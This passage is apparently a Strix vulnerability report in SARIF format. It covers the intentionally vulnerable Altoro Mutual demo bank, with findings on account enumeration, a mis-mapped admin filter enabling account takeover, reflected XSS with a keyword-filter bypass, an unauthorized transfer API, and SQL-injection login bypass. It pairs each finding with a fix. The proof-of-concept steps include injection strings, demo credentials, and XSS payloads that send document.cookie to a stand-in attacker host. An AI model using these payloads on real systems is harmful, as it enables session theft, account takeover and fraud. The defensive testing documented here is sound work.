          "properties": {
            "security-severity": "6.5",
            "strix_vuln_class_hash": "ebf1ba63c404f36a89caddaa6fe5f69242fcb30f0ba18d9b0a595b1226f560fa",
            "strix": {
              "id": "vuln-0004",
              "severity": "medium",
              "cvss": 6.5,
              "timestamp": "2026-09-20 21:46:15 UTC",
              "target": "http://demo.testfire.net",
              "endpoint": "/api/account/{accountNo}",
              "method": "GET",
              "cwe": "CWE-639",
              "impact": "An authenticated attacker can enumerate the account-number space and read the balance, credit/debit history and last-10-transactions of accounts that are not their own. Using the lowest-privilege account (`jsmith`), 12 accounts outside the caller's own account list were retrieved in a single pass over a contiguous numeric range, so the entire account population is reachable by an authenticated user. This is horizontal privilege escalation with broad unauthorized disclosure of other customers' financial data.",
              "technical_analysis": "The application models per-user account ownership: `GET /api/account` returns only the caller's accounts, the `AltoroAccounts` client cookie lists only the caller's accounts, and `main.jsp` renders only the caller's accounts. The object-level endpoints, however, look up an account by the raw path/query parameter and never re-check ownership.\n\nIn `AccountAPI.getAccountBalance` (`GET /api/account/{accountNo}`) the account is fetched with `Account.getAccount(accountNo)` — the source even carries the comment `// not checking the account number, side privilege escalation possible` — and the response then includes the balance plus `credits`, `debits` and `last_10_transactions`. `AccountAPI.showLastTenTransactions` (`GET /api/account/{accountNo}/transactions`) likewise calls `getLastTenTransactions(accountNo)` directly. Only the `POST` variant uses `user.lookupAccount(...)`, which is why it correctly returns no data for foreign accounts.\n\nThe web path has the same defect: `AccountViewServlet.doGet` forwards `listAccounts` straight to `/bank/balance.jsp?acctId=<value>`, and `balance.jsp` calls `Account.getAccount(paramName).getBalance()` without checking that `paramName` is among `user.getAccounts()`. The page renders the foreign account's balance and transaction list.\n\nThe correct control already exists in the codebase — `User.lookupAccount(Long)` returns `null` when the account is not the caller's (used by the POST path). The fix applies that same check before any account data is read.",
              "remediation_steps": "Bind every account lookup to the authenticated caller before any account data is read. For the REST resource, resolve the caller via the authenticated request context and reject the request when the requested account number is not among the caller's accounts — the existing helper `User.lookupAccount(Long)` already returns `null` for accounts that do not belong to the user and should be used as the gate, returning HTTP 403 (or 404 to avoid leaking account existence). Apply the same check to every endpoint that takes an account identifier, including the last-10-transactions route. On the web side, validate the account identifier against the session user's accounts in the account-history view and redirect to the account summary when it is not owned. Prefer a single reusable authorization helper over per-handler checks so new endpoints inherit the control, and add regression tests that assert a foreign account number yields no data on each route.",
              "counterevidence": "The target is an intentionally-vulnerable public demo application with synthetic account data, which caps real-world business impact. That does not neutralise the finding: the application itself models per-user account ownership — `GET /api/account`, the `AltoroAccounts` cookie, and `main.jsp` all list only the caller's accounts — so the object-level endpoints genuinely cross an authorization boundary rather than exposing an intentionally public data surface, and the missing check is confirmed in source. Checked for a control that would rule the finding out: there is none on the GET paths (the POST transactions path is scoped via `user.lookupAccount` and correctly returns no data). A negative control (non-existent accounts 800026-800030 and 800999) returned empty/error bodies while foreign accounts returned distinct balances and transaction sets, confirming the leaked data are real, distinct account records. No WAF or rate limiting was observed on the endpoint. Note that the account `4539082039396288` is present in jsmith's own account list and was therefore excluded from the cross-account claim.",
              "confidence": "high",
              "severity_change_conditions": "Confirmation that the deployment is a strictly isolated demo instance with no real customer data and is treated purely as a training artifact would reduce this to a low/informational demonstration issue; confirmation that the account space maps to many distinct real customers would keep confidentiality at High.",
              "fix_verification": "Security closure: the patched `getAccountBalance` and `showLastTenTransactions` resolve the caller with `OperationsUtil.getUser(request)` and gate on `user.lookupAccount(Long.parseLong(accountNo))` before any account data is read; for a foreign account this returns `null`, so the handler responds 403 and never reaches `Account.getAccount(...)`/`getLastTenTransactions(...)`. The web view sets `accountOwned` only when the requested id appears in `user.getAccounts()` and redirects otherwise. This mirrors the existing control already used by the POST transactions path, which was confirmed live to return no data for foreign accounts.\n\nBypass review: I checked the sibling account-reading routes — `GET /api/account/{accountNo}`, `GET /api/account/{accountNo}/transactions`, and the web `balance.jsp`/`showAccount` path are all addressed; `POST /api/account/{accountNo}/transactions` was already scoped and `transaction.jsp` already limits output to `user.getAccounts()`. Null/empty `acctId` (now redirects instead of erroring) and the long-valued credit-card account number were considered; `Long.parseLong` handles the latter.\n\nPreserved behaviour: access to the caller's own accounts is unchanged (the ownership test passes for owned accounts), the account selector dropdown still renders, and legitimate redirects still resolve to the account summary.\n\nRepository checks: NOT EXECUTED. No JDK or build toolchain is available and the application's third-party dependencies are not vendored, so the patched sources could not be compiled or the running app re-tested here. Security closure and bypass review above are static re-traces; this is the outstanding gap.",
              "poc": {
                "description": "1. Log in as the low-privilege user `jsmith` via `POST /api/login` and capture the Bearer token.\n2. Call `GET /api/account` to obtain the authoritative list of accounts the application attributes to the caller.\n3. Request a range of account numbers with `GET /api/account/{accountNo}` using the same token; any account not in the list is another customer's.\n4. Observe that foreign accounts return HTTP 200 with `balance`, `credits`, `debits` and `last_10_transactions`, whereas a non-existent account returns an empty/error body (negative control).\n5. Repeat with `GET /api/account/{accountNo}/transactions` and, using the web session (`POST /doLogin`), with `GET /bank/showAccount?listAccounts={accountNo}` to confirm the same exposure on all surfaces.",
                "script_available": true
              }
            }
          }
        },
        {
          "ruleId": "CWE-862",
          "ruleIndex": 4,
          "level": "error",
          "message": {
            "text": "Broken Function-Level Authorization: Any Authenticated Customer Can Invoke Admin Functions and Take Over Accounts\n\nThe Altoro Mutual demo banking application does not enforce the administrator role on its administrative functions. Any authenticated customer — for example `jsmith`, an ordinary account holder with no administrative link in the UI — can directly invoke the site's admin functions (`/admin/admin.jsp`, `/admin/addUser`, `/admin/changePassword`, `/admin/addAccount`) and the corresponding REST endpoints (`/api/admin/addUser`, `/api/admin/changePassword`). This was demonstrated by using a normal customer session to create a new user, to create new bank accounts, and to reset the password of a pre-existing account that the attacker does not own and then authenticate as it."
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "WebContent/WEB-INF/web.xml"
                },
                "region": {
                  "startLine": 46,
                  "endLine": 46,
                  "snippet": {
                    "text": "<url-pattern>/adimn/*</url-pattern>"
                  }
                }
              },
              "message": {
                "text": "Correct the AdminFilter URL-pattern typo so the role filter actually protects /admin/*"
              }
            },
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "src/com/ibm/security/appscan/altoromutual/api/AdminAPI.java"
                },
                "region": {
                  "startLine": 25,
                  "endLine": 25,
                  "snippet": {
                    "text": "//Don't really care if the user is admin or not - I think that's how it works in AltoroJ"
                  }
                }
              },
              "message": {
                "text": "API admin handlers authenticate the token but never verify the admin role (ApiAuthFilter only calls DBUtil.isValidUser)"
              }
            },
            {
              "logicalLocations": [
                {
                  "fullyQualifiedName": "/admin/addUser",
                  "kind": "endpoint"
                }
              ]
            }
          ],
          "fixes": [
            {
              "artifactChanges": [
                {
                  "artifactLocation": {
                    "uri": "WebContent/WEB-INF/web.xml"
                  },
                  "replacements": [
                    {
                      "deletedRegion": {
                        "startLine": 46,
                        "endLine": 46
                      },
                      "insertedContent": {
                        "text": "<url-pattern>/admin/*</url-pattern>"
                      }
                    }
                  ]
                }
              ],
              "description": {
                "text": "1. Correct the AdminFilter mapping in `WebContent/WEB-INF/web.xml`: change the URL pattern from the misspelled `/adimn/*` to `/admin/*` so the administrator-role filter actually runs for every administrative route. This is the primary defect and closes the demonstrated web-console exploit.\n2. Extend role enforcement to the REST administration surface. The URL-pattern-based AdminFilter does not cover the JAX-RS servlet, so `/api/admin/*` must be protected separately — for example by requiring the authenticated principal's role to be admin inside `ApiAuthFilter` for the `AdminAPI` resource class, or by invoking an equivalent role check at the start of each admin handler.\n3. Do not rely on the `enableAdminFunctions` feature flag as a security control. It is a behavior toggle that is off by default and can be enabled by configuration; authorization must not depend on it.\n4. Apply the principle of least privilege at the function boundary: each administrative handler (`addUser`, `changePassword`, `addAccount` and their API equivalents) should deny by default and re-verify the caller's role on every request, rather than trusting a single upstream filter that can be mis-mapped.\n5. Add a regression test that authenticates as a known non-admin user and asserts that every `/admin/*` and `/api/admin/*` route returns an authorization failure (redirect to login/main or HTTP 403) and performs no state change.",
                "markdown": "1. Correct the AdminFilter mapping in `WebContent/WEB-INF/web.xml`: change the URL pattern from the misspelled `/adimn/*` to `/admin/*` so the administrator-role filter actually runs for every administrative route. This is the primary defect and closes the demonstrated web-console exploit.\n2. Extend role enforcement to the REST administration surface. The URL-pattern-based AdminFilter does not cover the JAX-RS servlet, so `/api/admin/*` must be protected separately — for example by requiring the authenticated principal's role to be admin inside `ApiAuthFilter` for the `AdminAPI` resource class, or by invoking an equivalent role check at the start of each admin handler.\n3. Do not rely on the `enableAdminFunctions` feature flag as a security control. It is a behavior toggle that is off by default and can be enabled by configuration; authorization must not depend on it.\n4. Apply the principle of least privilege at the function boundary: each administrative handler (`addUser`, `changePassword`, `addAccount` and their API equivalents) should deny by default and re-verify the caller's role on every request, rather than trusting a single upstream filter that can be mis-mapped.\n5. Add a regression test that authenticates as a known non-admin user and asserts that every `/admin/*` and `/api/admin/*` route returns an authorization failure (redirect to login/main or HTTP 403) and performs no state change."
              }
            }
          ],
          "partialFingerprints": {
            "primaryLocationLineHash": "8b2a63eed67d4fd935be13f44da7ec40c6f5c606b746cf52ad9530cbef91d428"
          },
          "properties": {
            "security-severity": "8.1",
            "strix_vuln_class_hash": "2bfb28c30e8caece194926be41abcd57228f78c6c8e7672a961bf76d00c80083",
            "strix": {
              "id": "vuln-0005",
              "severity": "high",
              "cvss": 8.1,
              "timestamp": "2026-09-20 21:46:59 UTC",
              "target": "http://demo.testfire.net",
              "endpoint": "/admin/addUser",
              "method": "POST",
              "cwe": "CWE-862",
              "impact": "A low-privileged, authenticated customer is able to perform administrative operations that should require the admin role, resulting in full account takeover and privilege escalation. Demonstrated consequences: (1) creating arbitrary new user accounts that can then authenticate; (2) resetting the password of any existing user, including accounts the attacker does not own — the attacker then logs in as that victim (proven against account `test_normal_abc`); and (3) creating new bank accounts attached to any user. In effect, any customer can mint credentials and seize other customers' accounts, which for a banking application equates to complete compromise of customer authentication and account integrity. The administrative console, which also discloses the full user list and database schema, becomes readable by every logged-in user.",
              "technical_analysis": "The application separates two servlet filters: `AuthFilter` (checks only that a user is logged in) and `AdminFilter` (checks that the session user's role is `admin`). In `WebContent/WEB-INF/web.xml` the mappings are misconfigured:\n\n- `AuthFilter` is mapped to `/admin/*` (correct).\n- `AdminFilter` is mapped to `/adimn/*` — a misspelling of `/admin/*` — so `AdminFilter` never executes for real admin paths.\n\n`AdminFilter.doFilter` enforces the role boundary with `user.getRole() == Role.Admin`; because the filter is bound to a path that does not exist, the check is effectively absent for every administrative route. `AdminServlet` (`/admin/addUser`, `/admin/changePassword`, `/admin/addAccount`) and `admin.jsp` contain no role check of their own and rely entirely on the (now bypassed) filter, so any authenticated session reaches them.\n\nThe REST layer has the same defect. `ApiAuthFilter` only verifies that the bearer token maps to a valid user via `DBUtil.isValidUser(username, password)`; it never verifies the user's role. Consequently `/api/admin/addUser` and `/api/admin/changePassword` accept any valid non-admin token (and return `401` only when no token is presented). The source even documents the gap: `AdminAPI.changePassword` carries the comment \"Don't really care if the user is admin or not - I think that's how it works in AltoroJ\". These API handlers additionally gate the database write on the non-security feature flag `enableAdminFunctions`, which is disabled on this deployment, so the API calls currently return success without writing; the web servlet path is not so gated and performs real state changes.\n\nRoot cause: function-level authorization is enforced by a filter mapped to a non-existent URL pattern, and is not enforced at all on the API admin resource. Authentication is required, but authorization (admin role) is not.",
              "remediation_steps": "1. Correct the AdminFilter mapping in `WebContent/WEB-INF/web.xml`: change the URL pattern from the misspelled `/adimn/*` to `/admin/*` so the administrator-role filter actually runs for every administrative route. This is the primary defect and closes the demonstrated web-console exploit.\n2. Extend role enforcement to the REST administration surface. The URL-pattern-based AdminFilter does not cover the JAX-RS servlet, so `/api/admin/*` must be protected separately — for example by requiring the authenticated principal's role to be admin inside `ApiAuthFilter` for the `AdminAPI` resource class, or by invoking an equivalent role check at the start of each admin handler.\n3. Do not rely on the `enableAdminFunctions` feature flag as a security control. It is a behavior toggle that is off by default and can be enabled by configuration; authorization must not depend on it.\n4. Apply the principle of least privilege at the function boundary: each administrative handler (`addUser`, `changePassword`, `addAccount` and their API equivalents) should deny by default and re-verify the caller's role on every request, rather than trusting a single upstream filter that can be mis-mapped.\n5. Add a regression test that authenticates as a known non-admin user and asserts that every `/admin/*` and `/api/admin/*` route returns an authorization failure (redirect to login/main or HTTP 403) and performs no state change.",
              "counterevidence": "Actively challenged the finding: (1) \"Is jsmith actually an administrator by design?\" No — the application renders the admin navigation block only when `user.getRole() == User.Role.Admin`, and jsmith's `/bank/main.jsp` contains no administration link; jsmith is the seeded `'user'` account with a customer-only account set. The admin console is reached despite the UI never exposing it. (2) \"Does the endpoint silently no-op (fake success)?\" The web-servlet path produces real state changes: the created user appears in the persisted user list and authenticates, the password reset account authenticates with the attacker-chosen password, and the account list grows. (An initial round of tests appeared to no-op only because both login paths lowercase the password, which masked successful creates — this was identified and controlled for.) (3) \"Is there a downstream role check?\" `AdminServlet` and `AdminAPI` contain no role check, and `AdminFilter` never runs due to the URL-pattern typo; the only gate present on the API is the `enableAdminFunctions` behavior flag, which is not an authorization control. (4) \"Is test_normal_abc my own artifact?\" No — it pre-existed in the account list before testing and was reset with a new attacker-chosen password that then authenticated. Independent negative control: the same admin endpoints return `401` without any token, confirming that login is required and the missing element is specifically the admin-role authorization.",
              "confidence": "high",
              "severity_change_conditions": "Confirmation that the API admin handlers write state on a deployment where `enableAdminFunctions` is enabled (the flag is currently false) would broaden the already-serious web-console impact to every interface and argue for critical; conversely, if an external control (an authenticating reverse proxy or WAF) were proven to restrict `/admin/*` to staff, the reachable impact would drop and the severity would be lowered accordingly.",
              "fix_verification": "Security closure: re-traced the exploit path against the corrected configuration. With `AdminFilter` mapped to `/admin/*`, every request to `/admin/admin.jsp`, `/admin/addUser`, `/admin/changePassword` and `/admin/addAccount` now passes through `AdminFilter.doFilter`, which requires `user.getRole() == Role.Admin` and otherwise redirects the caller to `/bank/main.jsp` (or `/login.jsp` when unauthenticated). A user such as `jsmith` (role `user`) can therefore no longer reach the servlet or console, so the demonstrated create-user, reset-password and add-account actions are blocked. Bypass review: checked the alternate transports and mappings without leaning on the rationale — the URL-based filter does not cover the JAX-RS servlet, so `/api/admin/*` remains a separate gap and is called out in remediation and a second code location rather than being silently considered fixed; confirmed the only servlet mappings that reach `AdminServlet` are the three `/admin/*` paths, and that `AdminFilter` still permits only `/admin/login.jsp` and `/admin/doAdminLogin` without a role. Preserved behavior: legitimate users whose role is `Admin` continue to pass the filter, `AuthFilter` remains mapped to `/admin/*`, and the redirect targets for non-admins are unchanged. Repository checks: applied the one-line change to the checkout, confirmed both `/admin/*` filter-mappings are present and the `adimn` token no longer exists, and parsed `WebContent/WEB-INF/web.xml` with an XML parser (well-formed). The API-side Java role check (second location) was not compiled or executed here as no build was run — that gate is a stated gap, which is why that location is recorded as informational rather than as an applyable suggestion.",
              "poc": {
                "description": "1. Authenticate as the ordinary customer `jsmith` via `POST /doLogin` (uid=jsmith, passw=demo1234).\n2. Confirm the session is not administrative: `GET /bank/main.jsp` renders no \"ADMINISTRATION\" section and no `/admin/admin.jsp` link (that section is only emitted when the user's role is `Admin`).\n3. Request `GET /admin/admin.jsp` and observe HTTP 200 with the \"Edit User Information\" admin console.\n4. Invoke the admin add-user function: `POST /admin/addUser` with firstname, lastname, username and matching password1/password2. Observe HTTP 302 to admin.jsp, then confirm the created account authenticates via `POST /api/login`.\n5. Take over an existing, non-owned account: `POST /admin/changePassword` with `username=test_normal_abc` and an attacker-chosen password, then authenticate as `test_normal_abc` with that password via `POST /doLogin`.\n6. Invoke `POST /admin/addAccount` (username=jsmith, accttypes=Checking) and observe a new account added to the user's account list.\n7. Confirm the REST admin surface: `POST /api/admin/addUser` returns `401` without an Authorization header and `200 {\"success\":...}` when a normal user's bearer token is supplied.",
                "script_available": true
              }
            }
          }
        },
        {
          "ruleId": "CWE-79",
          "ruleIndex": 0,
          "level": "warning",
          "message": {
            "text": "Reflected XSS in GET /search.jsp 'query' parameter\n\nThe `query` parameter of `/search.jsp` is reflected into the HTML response body without any output encoding. An unauthenticated attacker can supply a crafted link that executes arbitrary JavaScript in the victim's browser in the context of the application origin."
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "SECURITY.md"
                }
              }
            },
            {
              "logicalLocations": [
                {
                  "fullyQualifiedName": "/search.jsp",
                  "kind": "endpoint"
                }
              ]
            }
          ],
          "partialFingerprints": {
            "primaryLocationLineHash": "a997ef857dff40e193df23b020c287c4541c02771a9ad86783c6d7ab3c070170"
          },
          "properties": {
            "security-severity": "6.1",
            "strix_vuln_class_hash": "841d192a59e6812ef6a771cf84fa82963f628884ed58037aa16b7e6cdd3695f8",
            "synthetic_location": true,
            "strix": {
              "id": "vuln-0006",
              "severity": "medium",
              "cvss": 6.1,
              "timestamp": "2026-09-20 21:48:00 UTC",
              "target": "http://demo.testfire.net",
              "endpoint": "/search.jsp",
              "method": "GET",
              "cwe": "CWE-79",
              "impact": "An attacker who lures an authenticated or unauthenticated victim to a crafted URL can run arbitrary JavaScript in the app origin. This enables theft of non-HttpOnly data (e.g. the `AltoroAccounts` cookie), performing authenticated actions as the victim (transfer funds, view accounts, change details) and phishing/credential capture inside the trusted origin. No authentication is required to deliver the payload.",
              "technical_analysis": "`/search.jsp` writes the user-supplied `query` value directly into the results HTML inside a `<p>` element with no HTML encoding and no output sanitisation. The response carries no `Content-Security-Policy` and no `X-XSS-Protection` header, and the `Content-Type` is `text/html;charset=ISO-8859-1`, so injected markup is parsed and executed as HTML/script. Special characters `<`, `>`, `\"`, `'` and `&` are all returned verbatim.\n\nReflection context (verbatim from response):\n```html\n<p>No results were found for the query:<br /><br />\n<script>document.title=\"PWNED_SRCH\"</script>\n```\n\nThe parameter is reachable unauthenticated over both HTTP and HTTPS.",
              "remediation_steps": "Apply context-aware output encoding to the `query` value before writing it into the HTML response (HTML-entity encode `&`, `<`, `>`, `\"`, `'`). Prefer the templating layer's automatic escaping instead of string concatenation. Add a restrictive `Content-Security-Policy` (e.g. `default-src 'self'; script-src 'self'`) as defence in depth, and consider a server-side input validation layer. Ensure the same escaping is applied on every code path that renders user input.",
              "counterevidence": "Considered a server-side filter or WAF: none is present for this parameter (the raw payload is echoed unchanged, and the deployment has no WAF). Considered browser XSS filtering: modern Chromium/Firefox do not block reflected XSS by default and the payload executed in a real browser session. Considered whether the reflected value is inert text: it is written into element content (not an attribute) and the `<script>` executed, proven by the changed `document.title`. No CSP is returned to block inline script.",
              "confidence": "high",
              "severity_change_conditions": "Evidence that the response is served with a strict CSP (e.g. nonce/hash-based `script-src`) that blocks inline script would lower severity; conversely a demonstrated cross-user/admin session compromise would raise it.",
              "poc": {
                "description": "1. Craft the URL `http://demo.testfire.net/search.jsp?query=<script>document.title=\"PWNED_SRCH\"</script>` (URL-encode the payload).\n2. Load the URL in a browser.\n3. Observe that the `<script>` is reflected unencoded into the page body and executes; `document.title` becomes `PWNED_SRCH`.\n4. Alternative high-impact payloads such as `<script>fetch('//attacker/'+document.cookie)</script>` execute in the same context.",
                "script_available": true
              }
            }
          }
        },
        {
          "ruleId": "CWE-79",
          "ruleIndex": 0,
          "level": "warning",
          "message": {
            "text": "Reflected XSS in GET /index.jsp 'content' parameter (keyword-filter bypass)\n\nThe `content` parameter of `/index.jsp` is reflected into the HTML response inside an error paragraph with no output encoding. A keyword blacklist is applied but can be bypassed with event handlers it does not cover (`ontoggle`, `onstart`), allowing unauthenticated script execution in the application origin."
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "SECURITY.md"
                }
              }
            },
            {
              "logicalLocations": [
                {
                  "fullyQualifiedName": "/index.jsp",
                  "kind": "endpoint"
                }
              ]
            }
          ],
          "partialFingerprints": {
            "primaryLocationLineHash": "a19a1606f3d5dd9d2d0ca61b0b3f879bfeb2d85236b0d9a1690accc44a636c80"
          },
          "properties": {
            "security-severity": "6.1",
            "strix_vuln_class_hash": "841d192a59e6812ef6a771cf84fa82963f628884ed58037aa16b7e6cdd3695f8",
            "synthetic_location": true,
            "strix": {
              "id": "vuln-0007",
              "severity": "medium",
              "cvss": 6.1,
              "timestamp": "2026-09-20 21:48:10 UTC",
              "target": "http://demo.testfire.net",
              "endpoint": "/index.jsp",
              "method": "GET",
              "cwe": "CWE-79",
              "impact": "An unauthenticated attacker can deliver a crafted URL that executes arbitrary JavaScript in the victim's browser within the application origin, enabling session riding on authenticated actions, theft of non-HttpOnly data, and in-origin phishing. Because the filter is a blacklist, it provides no real protection.",
              "technical_analysis": "`/index.jsp` takes a `content` parameter and, when the referenced resource cannot be resolved, writes an error string into the page that contains the raw value of `content`:\n\n```html\n<p>Failed due to The requested resource (/static/z<details open ontoggle=document.title=7>) is not available</p>\n```\n\nA blacklist filter suppresses some payloads: values containing `script`, `onerror`, `onload`, `onclick`, `onmouseover`, `onfocus`, `autofocus`, `javascript:` or `style` cause the echoed value to be dropped (the message becomes empty and the value is not reflected). However the filter does not cover `ontoggle` or `onstart`, so `<details open ontoggle=...>` and `<marquee onstart=...>` are reflected verbatim and their handlers auto-fire when the markup is parsed, yielding XSS. No CSP or X-XSS-Protection header is returned.\n\nFilter behaviour (observed):\n```\ncontent=z<b>M</b>                          -> reflected raw\ncontent=z<details open ontoggle=M>M</details> -> reflected raw\ncontent=z<marquee onstart=M>M</marquee>       -> reflected raw\ncontent=z<script>M</script>               -> suppressed (not reflected)\ncontent=z<img src=x onerror=M>            -> suppressed\ncontent=z<b style=M>M</b>                 -> suppressed\n```",
              "remediation_steps": "Do not reflect the `content` parameter into the response at all; return a static, generic error page. If reflection is required, HTML-entity-encode the value for the exact context. Replace the keyword blacklist with an allow-list of accepted content names, and add a restrictive `Content-Security-Policy` as defence in depth.",
              "counterevidence": "The application does implement a blacklist filter for `content`, which blocks common vectors such as `<script>`, `onerror`, `onload`, `onclick` and `style`. This is the strongest argument against exploitability, but it is bypassed by handlers it omits (`ontoggle`, `onstart`), demonstrated end-to-end in a browser. There is no CSP or X-XSS-Protection header that would otherwise block inline handlers. The reflected value is placed in element content (not an attribute), so the handlers execute normally.",
              "confidence": "high",
              "severity_change_conditions": "If the blacklist were replaced by strict output encoding or an allow-list such that no handler could be reflected, severity would drop to informational; a demonstrated cross-user impact would raise it.",
              "poc": {
                "description": "1. Craft `http://demo.testfire.net/index.jsp?content=z<details open ontoggle=document.title=7>` (URL-encode the payload).\n2. Load the URL in a browser.\n3. The `<details open ontoggle=...>` markup is reflected unencoded and the `ontoggle` handler fires on parse, setting `document.title` to `7`.\n4. Equivalent auto-firing payload `<marquee onstart=document.title=8>` also works; `<details open ontoggle=fetch('//attacker/'+document.cookie)>` executes in the same origin.",
                "script_available": true
              }
            }
          }
        },
        {
          "ruleId": "CWE-639",
          "ruleIndex": 3,
          "level": "warning",
          "message": {
            "text": "Broken Object-Level Authorization in POST /api/transfer enables transferring funds out of arbitrary accounts\n\nThe REST endpoint `POST /api/transfer` moves funds out of the account named in `fromAccount` without verifying that the account belongs to the authenticated caller. Any authenticated user can supply another customer's account number as the source and debit it into an account they control. The equivalent web endpoint (`POST /bank/doTransfer`) enforces the ownership check, so only the REST API is affected."
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "SECURITY.md"
                }
              }
            },
            {
              "logicalLocations": [
                {
                  "fullyQualifiedName": "/api/transfer",
                  "kind": "endpoint"
                }
              ]
            }
          ],
          "partialFingerprints": {
            "primaryLocationLineHash": "e488e99cfe0ed71ff473b2079d35e8d34adea3f52ab39ba638a7d55270a1fbc1"
          },
          "properties": {
            "security-severity": "6.5",
            "strix_vuln_class_hash": "0a2eee0d55b45c384157e56725b1f2b8c3cec579843ec2e0681aee6b6f4127e1",
            "synthetic_location": true,
            "strix": {
              "id": "vuln-0008",
              "severity": "medium",
              "cvss": 6.5,
              "timestamp": "2026-09-20 21:48:12 UTC",
              "target": "http://demo.testfire.net",
              "endpoint": "/api/transfer",
              "method": "POST",
              "cwe": "CWE-639",
              "impact": "An authenticated low-privilege user can transfer funds out of any other customer's account whose number they know or guess (account numbers are sequential/enumerable), crediting an account they control. This is direct unauthorized modification of another customer's financial records — theft of funds and integrity loss of the account ledger. The victim's balance is reduced and the attacker's increased, with the app returning a normal success message.",
              "technical_analysis": "`POST /api/transfer` accepts a JSON body `{ \"toAccount\", \"fromAccount\", \"transferAmount\" }` and is protected only by authentication (a Bearer token). The handler validates that the source account exists and that the caller is authenticated, but it never checks that `fromAccount` is owned by the authenticated user. Ownership is instead enforced only on the web `TransferServlet` (`POST /bank/doTransfer`), which returns `ERROR: Originating account is invalid` when the source does not belong to the session user.\n\nConsequently the API performs the debit/credit on whatever source account is supplied. Because account numbers are sequential, an attacker can iterate them and drain each in turn. The bug is an authorization gap on a state-changing operation (object reference is attacker-controlled and not scoped to the caller), not merely a data-exposure issue — the effect is a durable balance change on a foreign object.",
              "remediation_steps": "Enforce server-side object-level authorization on the transfer operation: before applying a transfer, verify that `fromAccount` (and any account the caller is debiting) is one of the accounts belonging to the authenticated principal, and reject the request with an authorization error otherwise. Apply this in a single shared authorization layer used by both the REST API and the web servlet so the two transports cannot diverge. Do not rely on the client-supplied account list or on UI restrictions; re-derive the caller's authorized accounts from the authenticated identity on every transfer request. Treat a failed ownership check as an authorization failure (403), not a validation error.",
              "counterevidence": "Actively checked for a control that would make this safe: (1) verified `800001` is genuinely not owned by the caller — it is absent from `GET /api/account` and the web transfer endpoint rejects it; (2) verified the debit actually landed on the foreign account row (balance moved -1.00) and not on the caller's account; (3) verified the request used only the caller's own token, ruling out token confusion; (4) the endpoint returned HTTP 200 with a success message, so no hidden validation rejected it. No ownership check, WAF, or secondary confirmation was observed on this path. The only constraint is that the attacker must hold some valid account, which is the normal authenticated-user position. This is a public demo with synthetic data, so the business/financial impact is illustrative, but the authorization invariant is genuinely violated.",
              "confidence": "high",
              "severity_change_conditions": "Confirmation that real (non-demo) customer funds or a production deployment share this code path would raise the severity to critical; if account numbers were non-enumerable and unguessable, exploitability would drop and severity would decrease.",
              "poc": {
                "description": "1. Authenticate to the REST API as the low-privilege user `jsmith` via `POST /api/login` and capture the returned `Authorization` token.\n2. Confirm the target account is not owned by the caller: `GET /api/account` lists jsmith's accounts (`800002`–`800023` + card `4539082039396288`) and does NOT include `800001`.\n3. Record the current balance of the foreign source account and of an account owned by jsmith (e.g. `800011`).\n4. Send `POST /api/transfer` with header `Authorization: Bearer <token>` and body `{\"toAccount\":\"800011\",\"fromAccount\":\"800001\",\"transferAmount\":\"1\"}`.\n5. Re-read both balances: the foreign account `800001` is debited and the attacker-controlled `800011` is credited, while the response reports success.\n6. For contrast, repeat the same request against the web endpoint `POST /bank/doTransfer` with a logged-in web session; it is rejected with `ERROR: Originating account is invalid`.",
                "script_available": true
              }
            }
          }
        },
        {
          "ruleId": "CWE-89",
          "ruleIndex": 5,
          "level": "error",
          "message": {
            "text": "SQL Injection Authentication Bypass in Login (POST /api/login and POST /doLogin)\n\nThe Altoro Mutual login credential check builds its SQL statement by concatenating the submitted username and password directly into the query. An unauthenticated attacker can inject SQL to bypass authentication on both the REST login (`POST /api/login`) and the web login (`POST /doLogin`), authenticating as any account — including `admin` — without knowing its password. Injection is possible through either the `username`/`uid` field (`admin'-- `) or the `password`/`passw` field (`' OR '1'='1`)."
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "AltoroJ 3.1.1/src/com/ibm/security/appscan/altoromutual/util/DBUtil.java"
                },
                "region": {
                  "startLine": 216,
                  "endLine": 219,
                  "snippet": {
                    "text": "Connection connection = getConnection();\n\t\tStatement statement = connection.createStatement();\n\t\t\n\t\tResultSet resultSet =statement.executeQuery(\"SELECT COUNT(*)FROM PEOPLE WHERE USER_ID = '\"+ user +\"' AND PASSWORD='\" + password + \"'\"); /* BAD - user input should always be sanitized */"
                  }
                }
              },
              "message": {
                "text": "Parameterize the credential-check query"
              }
            },
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "AltoroJ 3.1.1/src/com/ibm/security/appscan/altoromutual/util/DBUtil.java"
                },
                "region": {
                  "startLine": 22,
                  "endLine": 22,
                  "snippet": {
                    "text": "import java.sql.DriverManager;"
                  }
                }
              },
              "message": {
                "text": "Import PreparedStatement"
              }
            },
            {
              "logicalLocations": [
                {
                  "fullyQualifiedName": "/api/login",
                  "kind": "endpoint"
                }
              ]
            }
          ],
          "fixes": [
            {
              "artifactChanges": [
                {
                  "artifactLocation": {
                    "uri": "AltoroJ 3.1.1/src/com/ibm/security/appscan/altoromutual/util/DBUtil.java"
                  },
                  "replacements": [
                    {
                      "deletedRegion": {
                        "startLine": 216,
                        "endLine": 219
                      },
                      "insertedContent": {
                        "text": "Connection connection = getConnection();\n\t\tPreparedStatement statement = connection.prepareStatement(\"SELECT COUNT(*) FROM PEOPLE WHERE USER_ID = ? AND PASSWORD = ?\");\n\t\tstatement.setString(1, user);\n\t\tstatement.setString(2, password);\n\t\t\n\t\tResultSet resultSet = statement.executeQuery();"
                      }
                    }
                  ]
                },
                {
                  "artifactLocation": {
                    "uri": "AltoroJ 3.1.1/src/com/ibm/security/appscan/altoromutual/util/DBUtil.java"
                  },
                  "replacements": [
                    {
                      "deletedRegion": {
                        "startLine": 22,
                        "endLine": 22
                      },
                      "insertedContent": {
                        "text": "import java.sql.DriverManager;\nimport java.sql.PreparedStatement;"
                      }
                    }
                  ]
                }
              ],
              "description": {
